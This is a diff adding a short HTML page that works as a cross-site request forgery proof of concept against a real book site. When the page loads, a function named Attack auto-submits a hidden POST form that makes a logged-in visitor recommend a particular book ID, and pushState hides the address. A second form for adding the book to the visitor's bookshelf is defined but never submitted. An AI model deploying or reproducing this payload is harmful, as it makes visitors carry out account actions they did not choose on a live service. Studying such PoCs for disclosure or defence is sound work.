@@ -1,0 +1,20 @@
+<html>
+	<script>
+  function Attack(){
+        document.getElementById("test").submit();
+}
+</script>
+<body onload="Attack();">
+
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://www.ciweimao.com/book/give_recommend" method="POST" id="test">
+      <input type="hidden" name="book&#95;id" value="100067886" />
+      <input type="hidden" name="count" value="1" />
+    </form>
+<form action="https://www.ciweimao.com/bookshelf/favor" method="POST" id="test2">
+      <input type="hidden" name="book&#95;id" value="100067886" />
+    </form>
+
+	  </script>
+  </body>
+</html>
